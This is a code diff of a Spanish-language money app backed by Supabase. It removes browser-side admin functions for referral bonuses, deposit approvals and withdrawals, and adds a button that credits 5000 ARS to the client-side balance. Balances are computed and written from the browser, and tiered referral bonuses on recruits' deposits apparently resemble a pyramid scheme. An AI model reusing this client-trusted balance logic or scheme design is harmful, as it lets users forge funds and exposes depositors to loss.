-        else if (oficiales >= 10) bonoTotal = 8000;
-        else if (oficiales >= 5)  bonoTotal = 4000;
-        else if (oficiales >= 3)  bonoTotal = 2000;
-        else if (oficiales >= 1)  bonoTotal = 1000;
-
-        const yaCobrado = parseFloat(rec.bono_referidos_cobrado || 0);
-        const dif = bonoTotal - yaCobrado;
-
-        if (dif > 0) {
-          const nuevoBal = (parseFloat(rec.balance) || 0) + dif;
-          await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(rec.phone)}`, 'PATCH', {
-            balance: nuevoBal,
-            bono_referidos_cobrado: bonoTotal
-          });
-          actualizados++;
-        }
-      }
-
-      alert(`Auditoría finalizada con éxito. Se actualizaron ${actualizados} cuentas.`);
-      cargarSolicitudesAdmin();
-    };
-
-    window.aprobarDeposito = async function(solicitudId, phone, amount, type = 'recarga') {
-      const isRetiro = type === 'retiro';
-
-      if (isRetiro) {
-        if (!confirm(`¿Confirmas que ya transferiste el retiro de $${fmt(amount * 0.9)} ARS a ${phone}?`)) return;
-      } else {
-        if (!confirm(`¿Confirmas acreditar $${fmt(amount)} ARS a ${phone}?`)) return;
-      }
-
-      const users = await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(phone)}&select=*`);
-      let saldoActual = 0;
-      let invitadoPor = null;
-      let yaTeniaDeposito = false;
-
-      if (users && users.length > 0) {
-        saldoActual = parseFloat(users[0].balance) || 0;
-        invitadoPor = users[0].invited_by;
-        yaTeniaDeposito = users[0].has_deposited === true || saldoActual >= 2000;
-      }
-
-      if (!isRetiro) {
-        const nuevoSaldo = saldoActual + parseFloat(amount);
-        await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(phone)}`, 'PATCH', { 
-          balance: nuevoSaldo,
-          has_deposited: true 
-        });
-
-        if (!yaTeniaDeposito && parseFloat(amount) >= 2000 && invitadoPor) {
-          const cleanRef = String(invitadoPor).replace(/\D/g, '');
-          const sponsors = await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(cleanRef)}&select=*`);
-
-          if (sponsors && sponsors.length > 0) {
-            const sponsorPhone = sponsors[0].phone;
-            const saldoSponsor = parseFloat(sponsors[0].balance) || 0;
-
-            const refUsers = await supabaseRequest(`usuarios?invited_by=eq.${encodeURIComponent(sponsorPhone)}&select=balance,has_deposited`);
-            let cantOficiales = 1;
-            if (Array.isArray(refUsers)) {
-              cantOficiales = refUsers.filter(u => u.has_deposited === true || parseFloat(u.balance || 0) >= 2000).length;
-            }
-
-            let bonoPagar = 0;
-            if (cantOficiales === 1) bonoPagar = 1000;
-            else if (cantOficiales === 3) bonoPagar = 1000;
-            else if (cantOficiales === 5) bonoPagar = 2000;
-            else if (cantOficiales === 10) bonoPagar = 4000;
-            else if (cantOficiales === 20) bonoPagar = 7000;
-            else if (cantOficiales === 40) bonoPagar = 15000;
-            else if (cantOficiales === 50) bonoPagar = 30000;
-            else if (cantOficiales === 100) bonoPagar = 40000;
-
-            if (bonoPagar > 0) {
-              await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(sponsorPhone)}`, 'PATCH', { 
-                balance: saldoSponsor + bonoPagar 
-              });
-            }
-          }
-        }
-
-        if (appState.phone === phone) {
-          appState.balance = nuevoSaldo;
-          if (appState.pending >= amount) appState.pending -= amount;
-          saveLocal();
-        }
-      } else {
-        await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(phone)}`, 'PATCH', {
-          bank_verified: true,
-          last_withdraw: 0
-        });
-        if (appState.phone === phone) {
-          appState.bankVerified = true;
-          appState.lastWithdraw = 0;
-          appState.lastWithdrawNet = 0;
-          saveLocal();
-        }
-      }
-
-      if (String(solicitudId).startsWith('LOC-')) {
-        try {
-          let localQueue = JSON.parse(localStorage.getItem('cy_solicitudes_queue') || '[]');
-          localQueue = localQueue.filter(i => i.id !== solicitudId);
-          localStorage.setItem('cy_solicitudes_queue', JSON.stringify(localQueue));
-        } catch(e) {}
-      } else {
-        await supabaseRequest(`solicitudes?id=eq.${solicitudId}`, 'PATCH', { status: 'aprobado' });
-      }
-
-      alert(isRetiro ? "Retiro marcado como liquidado con éxito." : `Se acreditaron $${fmt(amount)} ARS a ${phone}.`);
-      cargarSolicitudesAdmin();
-    };
-
-    window.cancelarDeposito = async function(solicitudId, phone, amount, type = 'recarga') {
-      const isRetiro = type === 'retiro';
-
-      if (!confirm(`¿Deseas rechazar la solicitud de ${isRetiro ? 'retiro' : 'recarga'} de $${fmt(amount)} ARS de ${phone}?`)) return;
-
-      if (isRetiro) {
-        const users = await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(phone)}&select=balance,withdrawn`);
-        if (users && users.length > 0) {
-          const reintegroBal = (parseFloat(users[0].balance) || 0) + parseFloat(amount);
-          const ajustadoWithdrawn = Math.max(0, (parseFloat(users[0].withdrawn) || 0) - parseFloat(amount));
-          await supabaseRequest(`usuarios?phone=eq.${encodeURIComponent(phone)}`, 'PATCH', {
-            balance: reintegroBal,
-            withdrawn: ajustadoWithdrawn,
-            last_withdraw: 0
-          });
-        }
-        if (appState.phone === phone) {
-          appState.balance += parseFloat(amount);
-          appState.withdrawn = Math.max(0, appState.withdrawn - parseFloat(amount));
-          appState.lastWithdraw = 0;
-          appState.lastWithdrawNet = 0;
-          saveLocal();
-        }
-      } else {
-        if (appState.phone === phone) {
-          if (appState.pending >= amount) appState.pending -= amount;
-          saveLocal();
-        }
-      }
-
-      if (String(solicitudId).startsWith('LOC-')) {
-        try {
-          let localQueue = JSON.parse(localStorage.getItem('cy_solicitudes_queue') || '[]');
-          localQueue = localQueue.filter(i => i.id !== solicitudId);
-          localStorage.setItem('cy_solicitudes_queue', JSON.stringify(localQueue));
-        } catch(e) {}
-      } else {
-        await supabaseRequest(`solicitudes?id=eq.${solicitudId}`, 'PATCH', { status: 'rechazado' });
-      }
-
-      alert(`Solicitud rechazada y actualizada.`);
-      cargarSolicitudesAdmin();
-    };
-
-    function renderBankStatus() {
-      const badge = document.getElementById('bank-status-badge');
-      if (!badge) return;
-
-      if (appState.bankVerified) {
-        badge.className = "flex items-center gap-1 text-xs font-mono font-bold text-emerald-600";
-        badge.innerHTML = `<span class="w-2 h-2 rounded-full bg-emerald-500"></span> 🟢 Validado / Aprobado ✓`;
-      } else if (appState.cvu && appState.cvu.length >= 10) {
-        badge.className = "flex items-center gap-1 text-xs font-mono font-bold text-amber-600";
-        badge.innerHTML = `<span class="w-2 h-2 rounded-full bg-amber-500 animate-pulse"></span> 🟠 En proceso de validación`;
-      } else {
-        badge.className = "flex items-center gap-1 text-xs font-mono font-bold text-slate-400";
-        badge.innerHTML = `⚪ Sin vincular`;
-      }
-    }
+    document.getElementById('btn-admin-reject-w').addEventListener('click', async () => {
+      appState.balance += 5000;
+      appState.withdrawn = Math.max(0, appState.withdrawn - 5000);
+      saveLocal();
+      syncWithSupabase(false);
+      alert("Retiro rechazado. Fondos reintegrados al balance disponible.");
+      closeAdminModal();
+    });
 
     function renderUI() {
-      document.getElementById('home-balance-display').innerHTML = `$${fmt(appState.balance)} <span class="text-sm font-normal text-slate-400">ARS</span>`;
+      document.getElementById('home-balance-display').innerHTML = `$${fmt(appState.balance)} <span class="text-xs font-normal text-slate-400">ARS</span>`;
       document.getElementById('profile-bal-ars').innerText = `$${fmt(appState.balance)}`;
       document.getElementById('profile-pending-ars').innerText = `$${fmt(appState.pending)}`;
       document.getElementById('profile-withdrawn-ars').innerText = `$${fmt(appState.withdrawn)}`;
       document.getElementById('wallet-available-bal').innerText = `$${fmt(appState.balance)} ARS`;
-
-      // Estado del check-in diario en el perfil
-      const checkinText = document.getElementById('checkin-status-text');
-      const checkinBtn = document.getElementById('btn-claim-daily');
-      const now = Date.now();
-      const diffClaim = now - (appState.lastClaim || 0);
-
-      if (diffClaim < 24 * 60 * 60 * 1000) {
-        const remH = Math.ceil((24 * 60 * 60 * 1000 - diffClaim) / (1000 * 60 * 60));
-        if (checkinText) checkinText.innerText = `Reclamado ✓ (Disponible en ${remH}h)`;
-        if (checkinBtn) {
-          checkinBtn.innerText = "Cobrado ✓";
-          checkinBtn.className = "px-4 py-2 bg-slate-200 text-slate-500 text-xs font-bold rounded-xl cursor-not-allowed";
-        }
-      } else {
-        if (checkinText) checkinText.innerText = "+$500 ARS listos para reclamar";
-        if (checkinBtn) {
-          checkinBtn.innerText = "Cobrar";
-          checkinBtn.className = "px-4 py-2 bg-amber-400 hover:bg-amber-300 text-slate-950 text-xs font-black rounded-xl transition shadow cursor-pointer";
-        }
-      }
-
-      // Tarjeta de retiro
-      const withdrawBox = document.getElementById('active-withdraw-box');
-      const withdrawText = document.getElementById('active-withdraw-text');
-      const diffWithdraw = now - (appState.lastWithdraw || 0);
-
-      if (appState.lastWithdraw > 0 && diffWithdraw < 24 * 60 * 60 * 1000 && appState.lastWithdrawNet > 0) {
-        withdrawBox.classList.remove('hidden');
-        withdrawText.innerText = `Neto a recibir: $${fmt(appState.lastWithdrawNet)} ARS hacia CVU ${appState.cvu ? appState.cvu.slice(-4).padStart(appState.cvu.length, '*') : ''}`;
-      } else {
-        withdrawBox.classList.add('hidden');
-      }
-
-      renderBankStatus();
       renderPlans();
     }
 
-    applyTheme();
     checkAuth();
     renderProducts();
   </script>
 </body>
 </html>
-
-  
